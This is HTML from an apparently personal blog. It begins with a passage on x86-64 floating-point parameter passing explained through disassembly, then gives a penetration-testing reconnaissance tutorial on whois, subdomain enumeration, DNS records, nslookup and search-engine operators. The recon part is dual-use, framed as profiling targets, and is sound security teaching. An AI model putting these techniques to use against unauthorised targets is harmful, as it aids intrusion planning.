1176:	48 8d 64 24 f8       	lea    -0x8(%rsp),%rsp</span><br><span class="line">    117b:	f3 0f 11 04 24       	movss  %xmm0,(%rsp)</span><br><span class="line">    </span><br><span class="line">    ;此后的八个参数恰好用8个媒体寄存器xmm0~7传递</span><br><span class="line">    1180:	f3 0f 10 3d 84 0e 00 	movss  0xe84(%rip),%xmm7        # 200c &lt;_IO_stdin_used+0xc&gt;</span><br><span class="line">    1187:	00 </span><br><span class="line">    1188:	f3 0f 10 35 80 0e 00 	movss  0xe80(%rip),%xmm6        # 2010 &lt;_IO_stdin_used+0x10&gt;</span><br><span class="line">    118f:	00 </span><br><span class="line">    1190:	f3 0f 10 2d 7c 0e 00 	movss  0xe7c(%rip),%xmm5        # 2014 &lt;_IO_stdin_used+0x14&gt;</span><br><span class="line">    1197:	00 </span><br><span class="line">    1198:	f3 0f 10 25 78 0e 00 	movss  0xe78(%rip),%xmm4        # 2018 &lt;_IO_stdin_used+0x18&gt;</span><br><span class="line">    119f:	00 </span><br><span class="line">    11a0:	f3 0f 10 1d 74 0e 00 	movss  0xe74(%rip),%xmm3        # 201c &lt;_IO_stdin_used+0x1c&gt;</span><br><span class="line">    11a7:	00 </span><br><span class="line">    11a8:	f3 0f 10 15 70 0e 00 	movss  0xe70(%rip),%xmm2        # 2020 &lt;_IO_stdin_used+0x20&gt;</span><br><span class="line">    11af:	00 </span><br><span class="line">    11b0:	f3 0f 10 0d 6c 0e 00 	movss  0xe6c(%rip),%xmm1        # 2024 &lt;_IO_stdin_used+0x24&gt;</span><br><span class="line">    11b7:	00 </span><br><span class="line">    </span><br><span class="line">    ;蜜汁操作,就这个左边的参数搞特殊,非得用eax中转2一下,也是少见的64位机器上用到eax寄存器</span><br><span class="line">    11b8:	8b 05 6a 0e 00 00    	mov    0xe6a(%rip),%eax        # 2028 &lt;_IO_stdin_used+0x28&gt;</span><br><span class="line">    11be:	66 0f 6e c0          	movd   %eax,%xmm0</span><br><span class="line">    </span><br><span class="line">    ;参数准备完毕,可以调用函数func</span><br><span class="line">    11c2:	e8 62 ff ff ff       	call   1129 &lt;func&gt;</span><br><span class="line">    </span><br><span class="line">    ;尾声</span><br><span class="line">    11c7:	48 83 c4 10          	add    $0x10,%rsp	;传递最右侧两个参数时压栈16字节,此时正好退回16个字节.调用者清理参数</span><br><span class="line">    </span><br><span class="line">    ;eax存放main函数的返回值0</span><br><span class="line">    11cb:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">    11d0:	c9                   	leave  	;leave指令将栈中存放的rbp退还</span><br><span class="line">    11d1:	c3                   	ret    ;函数返回</span><br><span class="line">    </span><br><span class="line">    ;滥竽充数填充字节</span><br><span class="line">    11d2:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)</span><br><span class="line">    11d9:	00 00 00 </span><br><span class="line">    11dc:	0f 1f 40 00          	nopl   0x0(%rax)</span><br></pre></td></tr></table></figure>

<p>func函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0000000000001129 &lt;func&gt;:</span><br><span class="line">    1129:	55                   	push   %rbp</span><br><span class="line">    112a:	48 89 e5             	mov    %rsp,%rbp</span><br><span class="line">    112d:	f3 0f 11 45 fc       	movss  %xmm0,-0x4(%rbp)</span><br><span class="line">    1132:	f3 0f 11 4d f8       	movss  %xmm1,-0x8(%rbp)</span><br><span class="line">    1137:	f3 0f 11 55 f4       	movss  %xmm2,-0xc(%rbp)</span><br><span class="line">    113c:	f3 0f 11 5d f0       	movss  %xmm3,-0x10(%rbp)</span><br><span class="line">    1141:	f3 0f 11 65 ec       	movss  %xmm4,-0x14(%rbp)</span><br><span class="line">    1146:	f3 0f 11 6d e8       	movss  %xmm5,-0x18(%rbp)</span><br><span class="line">    114b:	f3 0f 11 75 e4       	movss  %xmm6,-0x1c(%rbp)</span><br><span class="line">    1150:	f3 0f 11 7d e0       	movss  %xmm7,-0x20(%rbp)</span><br><span class="line">    1155:	90                   	nop</span><br><span class="line">    1156:	5d                   	pop    %rbp</span><br><span class="line">    1157:	c3                   	ret    </span><br></pre></td></tr></table></figure>

<p>这里使用媒体寄存器传递的参数又压入栈中,这和前面我们学习过的x64linux使用的System V的整数传参时的约定是相同的</p>
<p>三个问题</p>
<p><strong>1.<code>movss  0xea0(%rip),%xmm0 </code>此处的<code>0xea0(%rip)</code>指向啥东西</strong></p>
<p>使用ida64反编译观察</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000000115C                 movss   xmm0, cs:dword_2004</span><br><span class="line">...</span><br><span class="line">.rodata:0000000000002004 dword_2004      dd 41200000h            ; DATA XREF: main+4↑r</span><br><span class="line">.rodata:0000000000002008 dword_2008      dd 41100000h            ; DATA XREF: main+16↑r</span><br><span class="line">.rodata:000000000000200C dword_200C      dd 41000000h            ; DATA XREF: main+28↑r</span><br><span class="line">.rodata:0000000000002010 dword_2010      dd 40E00000h            ; DATA XREF: main+30↑r</span><br><span class="line">.rodata:0000000000002014 dword_2014      dd 40C00000h            ; DATA XREF: main+38↑r</span><br><span class="line">.rodata:0000000000002018 dword_2018      dd 40A00000h            ; DATA XREF: main+40↑r</span><br><span class="line">.rodata:000000000000201C dword_201C      dd 40800000h            ; DATA XREF: main+48↑r</span><br><span class="line">.rodata:0000000000002020 dword_2020      dd 40400000h            ; DATA XREF: main+50↑r</span><br><span class="line">.rodata:0000000000002024 dword_2024      dd 40000000h            ; DATA XREF: main+58↑r</span><br><span class="line">.rodata:0000000000002028 dword_2028      dd 3F800000h            ; DATA XREF: main+60↑r</span><br></pre></td></tr></table></figure>

<p>可以发现,该位置在只读变量rodata区,存了这么一个值<code>0x41200000h</code></p>
<p>然而我们主函数中传递的是10啊,这存了一个鬼啊?</p>
<p>这就是IEEE754规定的浮点数存储方法了,下面我们可以算他一下</p>
<p>这个16进制数展开成一个32位二进制数为<br>$$<br>0100’0001’0010’0000’0000’0000’0000’0000<br>$$<br>按照s,exp,frac划分开</p>
<table>
<thead>
<tr>
<th>s</th>
<th>exp</th>
<th>frac</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>1000 0010</td>
<td>010 0000 0000 0000 0000</td>
</tr>
</tbody></table>
<p>对于一个32位的float,其exp占用k&#x3D;8位,其frac占用n&#x3D;23位</p>
<p>$Bias&#x3D;2^{k-1}-1&#x3D;2^7-1&#x3D;127(10)&#x3D;0111’1111(2)$</p>
<p>$E&#x3D;exp-Bias&#x3D;1000’0010-0111’1111&#x3D;0000’0011&#x3D;3$</p>
<p>$M&#x3D;1+frac&#x3D;1+2^{-2}&#x3D;\frac{5}{4}$</p>
<p>$(-1)^s\times M\times 2^E&#x3D;1\times \frac{5}{4}\times 2^3&#x3D;10$</p>
<p>正好是我们主函数中对func传递的参数中最右边那个</p>
<p>2.<strong>在最右侧两个参数压栈传递的时候</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1164:	48 8d 64 24 f8       	lea    -0x8(%rsp),%rsp	;rsp=rsp-8,栈上申请8字节空间</span><br><span class="line">1169:	f3 0f 11 04 24       	movss  %xmm0,(%rsp)		;从xmm0搬到M[rsp]上</span><br></pre></td></tr></table></figure>

<p>为啥每个参数要在栈上开8字节的空间?</p>
<p>后面func中将媒体寄存器中的参数压栈的时候却每个参数占用4字节的空间.</p>
<p>这也是x64Linux上System V的调用约定,参数传递的时候要8字节对齐,不管是int还是long还是double还是float,只要是用栈传递参数,就要每个参数8字节对齐</p>
<p><strong>3.我们在main函数调用func时传递的参数都是立即数<code>1,2,3,4,5,6,7,8,9,10</code></strong></p>
<p>但是在汇编层面上为什么没有直接用立即数<code>$1,$2</code>这种,而是采用PC相对寻址,去.rodata区找变量呢?</p>
<p><code>   115c:	f3 0f 10 05 a0 0e 00 	movss  0xea0(%rip),%xmm0</code></p>
<p>这是浮点常数和整数常数的区别</p>
<p>与浮点操作相关的指令,不能以立即数作为操作数,编译器必须为所有常数分配和初始化存储空间</p>
<p>将常数写入内存,然后采用各种寻址方法去找常数</p>
<h4 id="返回值约定"><a href="#返回值约定" class="headerlink" title="返回值约定"></a>返回值约定</h4><p>如果一个函数返回值为浮点类型,会使用什么寄存器返回呢?eax还是xmm0?</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">float</span> <span class="title function_">func</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1.0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/desktop/float]</span><br><span class="line">└─# gcc main.c -O0 -c -o main.o</span><br><span class="line"></span><br><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/desktop/float]</span><br><span class="line">└─# objdump main.o -d &gt; main.s</span><br></pre></td></tr></table></figure>

<p><code>main.s</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0000000000000000 &lt;func&gt;:</span><br><span class="line">   0:	55                   	push   %rbp</span><br><span class="line">   1:	48 89 e5             	mov    %rsp,%rbp</span><br><span class="line">   4:	f3 0f 10 05 00 00 00 	movss  0x0(%rip),%xmm0        # c &lt;func+0xc&gt;</span><br><span class="line">   b:	00 </span><br><span class="line">   c:	5d                   	pop    %rbp</span><br><span class="line">   d:	c3                   	ret    </span><br></pre></td></tr></table></figure>

<p>用的xmm0寄存器传递浮点参数</p>
<h4 id=""><a href="#" class="headerlink" title=""></a></h4>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/06/05/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/06/05/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="post-title-link" itemprop="url">渗透测试信息收集</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-06-05 00:17:00" itemprop="dateCreated datePublished" datetime="2022-06-05T00:17:00+08:00">2022-06-05</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-07-22 21:12:58" itemprop="dateModified" datetime="2022-07-22T21:12:58+08:00">2022-07-22</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>今天是你的生日,但是有什么可以值得庆祝的呢?你就是一风暴兵罢了</p>
<h1 id="渗透测试信息收集"><a href="#渗透测试信息收集" class="headerlink" title="渗透测试信息收集"></a>渗透测试信息收集</h1><h2 id="域名信息收集"><a href="#域名信息收集" class="headerlink" title="域名信息收集"></a>域名信息收集</h2><h3 id="Whois域名信息收集"><a href="#Whois域名信息收集" class="headerlink" title="Whois域名信息收集"></a>Whois域名信息收集</h3><p>whois是一个标准互联网协议,用于收集注册域名,IP地址,自治系统信息,whois数据库中记录有该域名的DNS服务器信息和注册人的联系信息</p>
<p>在linux上直接用<code>whois &lt;domain&gt;</code>或者<code>whois &lt;ip_addreess&gt;</code></p>
<p>使用<code>whois --help</code>可以查看帮助</p>
<p>比如:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali]</span><br><span class="line">└─# whois baidu.com</span><br><span class="line">   Domain Name: BAIDU.COM</span><br><span class="line">   Registry Domain ID: 11181110_DOMAIN_COM-VRSN</span><br><span class="line">   Registrar WHOIS Server: whois.markmonitor.com</span><br><span class="line">   Registrar URL: http://www.markmonitor.com</span><br><span class="line">   Updated Date: 2022-01-25T09:00:46Z</span><br><span class="line">   Creation Date: 1999-10-11T11:05:17Z</span><br><span class="line">   Registry Expiry Date: 2026-10-11T11:05:17Z</span><br><span class="line">   Registrar: MarkMonitor Inc.</span><br><span class="line">   Registrar IANA ID: 292</span><br><span class="line">   Registrar Abuse Contact Email: abusecomplaints@markmonitor.com</span><br><span class="line">   Registrar Abuse Contact Phone: +1.2086851750</span><br><span class="line">   Domain Status: clientDeleteProhibited https://icann.org/epp#clientDeleteProhibited</span><br><span class="line">   Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited</span><br><span class="line">   Domain Status: clientUpdateProhibited https://icann.org/epp#clientUpdateProhibited</span><br><span class="line">   Domain Status: serverDeleteProhibited https://icann.org/epp#serverDeleteProhibited</span><br><span class="line">   Domain Status: serverTransferProhibited https://icann.org/epp#serverTransferProhibited</span><br><span class="line">   Domain Status: serverUpdateProhibited https://icann.org/epp#serverUpdateProhibited</span><br><span class="line">   Name Server: NS1.BAIDU.COM</span><br><span class="line">   Name Server: NS2.BAIDU.COM</span><br><span class="line">   Name Server: NS3.BAIDU.COM</span><br><span class="line">   Name Server: NS4.BAIDU.COM</span><br><span class="line">   Name Server: NS7.BAIDU.COM</span><br><span class="line">   DNSSEC: unsigned</span><br></pre></td></tr></table></figure>

<p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20220603174503238.png" alt="image-20220603174503238"></p>
<p>在windows上不能使用whois命令,但是可以去站长之家或者爱站网查询</p>
<p><a target="_blank" rel="noopener" href="https://www.chinaz.com/">站长之家</a></p>
<p><a target="_blank" rel="noopener" href="https://www.aizhan.com/">站长工具-爱站网</a></p>
<h3 id="子域名信息收集"><a href="#子域名信息收集" class="headerlink" title="子域名信息收集"></a>子域名信息收集</h3><h4 id="搜索引擎方法"><a href="#搜索引擎方法" class="headerlink" title="搜索引擎方法"></a>搜索引擎方法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">site:&lt;domain&gt;</span><br><span class="line">e.g.</span><br><span class="line">site:dustball.top</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220603174616042.png" alt="image-20220603174616042"></p>
<h4 id="爬虫方法"><a href="#爬虫方法" class="headerlink" title="爬虫方法"></a>爬虫方法</h4><p>burpsuite add new scan</p>
<p>比如爬某个学校的物理实验网站</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220603222904097.png" alt="image-20220603222904097"></p>
<h4 id="子域名查询网站"><a href="#子域名查询网站" class="headerlink" title="子域名查询网站"></a>子域名查询网站</h4><p>爱站网</p>
<p>站长之家</p>
<p>比如查询某<del>H</del>电影的网站</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220603223504262.png" alt="image-20220603223504262"></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220603223604889.png" alt="image-20220603223604889"></p>
<p>他木有子域名</p>
<h4 id="本地工具"><a href="#本地工具" class="headerlink" title="本地工具"></a>本地工具</h4><h5 id="Layer子域名挖掘机"><a href="#Layer子域名挖掘机" class="headerlink" title="Layer子域名挖掘机"></a>Layer子域名挖掘机</h5><p>windows上的子域名挖掘工具</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220603223947457.png" alt="image-20220603223947457"></p>
<h5 id="wydomain"><a href="#wydomain" class="headerlink" title="wydomain"></a>wydomain</h5><p>linux上的工具</p>
<h4 id="备案号查询"><a href="#备案号查询" class="headerlink" title="备案号查询"></a>备案号查询</h4><h4 id="SSL证书查询"><a href="#SSL证书查询" class="headerlink" title="SSL证书查询"></a>SSL证书查询</h4><h4 id="crossdomain-xml文件"><a href="#crossdomain-xml文件" class="headerlink" title="crossdomain.xml文件"></a>crossdomain.xml文件</h4><p>比如<code>https://www.baidu.com/crossdomain.xml</code></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">This XML file does not appear to have any style information associated with it. The document tree is shown below.</span><br><span class="line"><span class="tag">&lt;<span class="name">cross-domain-policy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">allow-access-from</span> <span class="attr">domain</span>=<span class="string">&quot;*.baidu.com&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">allow-access-from</span> <span class="attr">domain</span>=<span class="string">&quot;*.bdstatic.com&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">allow-http-request-headers-from</span> <span class="attr">domain</span>=<span class="string">&quot;*.baidu.com&quot;</span> <span class="attr">headers</span>=<span class="string">&quot;*&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">allow-http-request-headers-from</span> <span class="attr">domain</span>=<span class="string">&quot;*.bdstatic.com&quot;</span> <span class="attr">headers</span>=<span class="string">&quot;*&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">cross-domain-policy</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="DNS信息收集"><a href="#DNS信息收集" class="headerlink" title="DNS信息收集"></a>DNS信息收集</h3><h4 id="DNS记录类型"><a href="#DNS记录类型" class="headerlink" title="DNS记录类型"></a>DNS记录类型</h4><p>DNS数据库是一个分布式数据库,每一台DNS服务器都存储了一些资源记录,作用是记录域名到IP地址的映射</p>
<p>资源记录是一个四元组<code>(Name,Value,Type,TTL)</code></p>
<p>其中TTL是该条记录的生存时间,决定了资源记录应当从DNS服务器缓存中删除的时间</p>
<p>Type决定了记录的类型,Name和Value的意义都视Type而定</p>
<h5 id="Type-A"><a href="#Type-A" class="headerlink" title="Type&#x3D;A"></a>Type&#x3D;A</h5><p>Name&#x3D;主机名</p>
<p>Value&#x3D;该主机名对应的IP地址</p>
<p>A类记录提供了标准的域名到IP的映射</p>
<blockquote>
<p>比如<code>(deutschball.github.io,185.199.109.153,A)</code></p>
</blockquote>
<p>显然这个记录应该由权威DNS服务器存储,当然其他各级DNS服务器都可以缓存,但是最终来源是权威DNS服务器.</p>
<p>Value指向的就是一台终端</p>
<h5 id="Type-NS"><a href="#Type-NS" class="headerlink" title="Type&#x3D;NS"></a>Type&#x3D;NS</h5><p>Name&#x3D;域</p>
<p>Value&#x3D;该域中一台权威DNS服务器的主机名</p>
<blockquote>
<p>权威DNS服务器:管理本域中的计算机IP和名称的映射.其作用类似于一个排的排长,其他计算机类似于班里的士兵,当其他班的士兵要找本班的许三多时,要先去找史班长问哪一个是许三多</p>
</blockquote>
<p>这种记录的作用是路由DNS查询,啥意思呢?</p>
<p>比如<code>(baidu.com,dns.baidu.com,NS)</code></p>
<p>在用户需要解析<code>baidu.com</code>时请求发往<code>baidu.com</code>域,然后这个域控(可能是域控?)会将该请求交给本域的DNS权威服务器<code>dns.baidu.com</code>去解析</p>
<h5 id="Type-CNAME"><a href="#Type-CNAME" class="headerlink" title="Type&#x3D;CNAME"></a>Type&#x3D;CNAME</h5><p>Value是规范主机名,Name是该主机的别名</p>
<p>这个在搭建博客买域名的时候遇见过</p>
<p>本来的博客dns地址是<code>deutschball.github.io</code>,买了一个域名<code>dustball.top</code>,</p>
<p>在域名解析的时候并没有将<code>dustball.top</code>和<code>ip</code>地址直接挂钩,</p>
<p>而是增加了一条CNAME记录,将<code>dustball.top</code>和<code>deutschball.github.io</code>挂钩</p>
<p>实际解析成IP地址还是得指望原名和IP的A记录</p>
<h5 id="Type-MX"><a href="#Type-MX" class="headerlink" title="Type&#x3D;MX"></a>Type&#x3D;MX</h5><p>Name&#x3D;邮件服务器别名</p>
<p>Value&#x3D;邮件服务器本名</p>
<p>MX记录允许邮件服务器具有简单的别名,通常是和web服务器同名,比如:</p>
<p><code>dustbal@mail.qq.com</code>写成<code>dustbal@qq.com</code>实际上是一个地址</p>
<p>MX的作用和CNAME类似,但是为了获得邮件服务器的规范主机名就是得用MX记录,其他服务器的规范主机名用CNAME记录</p>
<h4 id="DNS记录查询"><a href="#DNS记录查询" class="headerlink" title="DNS记录查询"></a>DNS记录查询</h4><p>nslookup命令</p>
<h5 id="查询A记录"><a href="#查询A记录" class="headerlink" title="查询A记录"></a>查询A记录</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup &lt;域名&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿Executor)-[~]</span><br><span class="line">└─$ nslookup baidu.com</span><br><span class="line">Server:         172.28.0.1</span><br><span class="line">Address:        172.28.0.1#53</span><br><span class="line"></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">Name:   baidu.com</span><br><span class="line">Address: 220.181.38.148</span><br><span class="line">Name:   baidu.com</span><br><span class="line">Address: 220.181.38.251</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>抓包观察</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220603232445678.png" alt="image-20220603232445678"></p>
<h5 id="查询MX记录"><a href="#查询MX记录" class="headerlink" title="查询MX记录"></a>查询MX记录</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup -type=mx &lt;域名&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">┌──(root㉿Executor)-[/home/kali]</span><br><span class="line">└─# nslookup -<span class="built_in">type</span>=mx stu.xidian.edu.cn</span><br><span class="line">main parsing stu.xidian.edu.cn</span><br><span class="line">....</span><br><span class="line">Non-authoritative answer:</span><br><span class="line">printsection()</span><br><span class="line">stu.xidian.edu.cn       mail exchanger = 30 mx-edu.icoremail.net.</span><br><span class="line"></span><br><span class="line">....</span><br></pre></td></tr></table></figure>



<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220603232844820.png" alt="image-20220603232844820"></p>
<h5 id="查询NX记录"><a href="#查询NX记录" class="headerlink" title="查询NX记录"></a>查询NX记录</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup -type=nx &lt;域名&gt;</span><br></pre></td></tr></table></figure>

<h5 id="查询所有类型"><a href="#查询所有类型" class="headerlink" title="查询所有类型"></a>查询所有类型</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup -type=any &lt;域名&gt;</span><br></pre></td></tr></table></figure>

<h5 id="交互模式"><a href="#交互模式" class="headerlink" title="交互模式"></a>交互模式</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup</span><br></pre></td></tr></table></figure>





<h3 id="搜索引擎利用"><a href="#搜索引擎利用" class="headerlink" title="搜索引擎利用"></a>搜索引擎利用</h3><h4 id="基本搜索"><a href="#基本搜索" class="headerlink" title="基本搜索"></a>基本搜索</h4><h5 id="逻辑与AND"><a href="#逻辑与AND" class="headerlink" title="逻辑与AND"></a>逻辑与AND</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220603235155842.png" alt="image-20220603235155842"></p>
<h5 id="逻辑或"><a href="#逻辑或" class="headerlink" title="逻辑或"></a>逻辑或</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220603235313124.png" alt="image-20220603235313124"></p>
<h5 id="逻辑非"><a href="#逻辑非" class="headerlink" title="逻辑非"></a>逻辑非</h5><p>如果搜索”调用约定”时</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220603235450822.png" alt="image-20220603235450822"></p>
<p>不想看到CSDN的结果</p>
<p><code>调用约定 -csdn</code></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220603235527399.png" alt="image-20220603235527399"></p>
<h5 id="通配"><a href="#通配" class="headerlink" title="通配"></a>通配</h5><p>使用通配符*</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220603235720991.png" alt="image-20220603235720991"></p>
<h4 id="进阶用法"><a href="#进阶用法" class="headerlink" title="进阶用法"></a>进阶用法</h4><h5 id="限定站点范围"><a href="#限定站点范围" class="headerlink" title="限定站点范围"></a>限定站点范围</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:&lt;站点&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220603235947419.png" alt="image-20220603235947419"></p>
<h5 id="标题含有关键词"><a href="#标题含有关键词" class="headerlink" title="标题含有关键词"></a>标题含有关键词</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intitle &quot;&lt;keyword&gt;&quot;</span><br></pre></td></tr></table></figure>



<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604000132277.png" alt="image-20220604000132277"></p>
<h5 id="标题含有多组关键词"><a href="#标题含有多组关键词" class="headerlink" title="标题含有多组关键词"></a>标题含有多组关键词</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allintitle &lt;keyword1&gt; &lt;keyword2&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604000632480.png" alt="image-20220604000632480"></p>
<h5 id="所有链接到某个URL地址的网页"><a href="#所有链接到某个URL地址的网页" class="headerlink" title="所有链接到某个URL地址的网页"></a>所有链接到某个URL地址的网页</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">link: &lt;域名&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604000822823.png" alt="image-20220604000822823"></p>
<h5 id="含有关键字的url地址"><a href="#含有关键字的url地址" class="headerlink" title="含有关键字的url地址"></a>含有关键字的url地址</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inurl: &lt;keyword&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604001059596.png" alt="image-20220604001059596"></p>
<h5 id="特定拓展名文件"><a href="#特定拓展名文件" class="headerlink" title="特定拓展名文件"></a>特定拓展名文件</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filetype: &lt;ex_name&gt;</span><br></pre></td></tr></table></figure>

<h4 id="配合应用"><a href="#配合应用" class="headerlink" title="配合应用"></a>配合应用</h4><p>在某网站下搜索含有某关键字标题的页面</p>
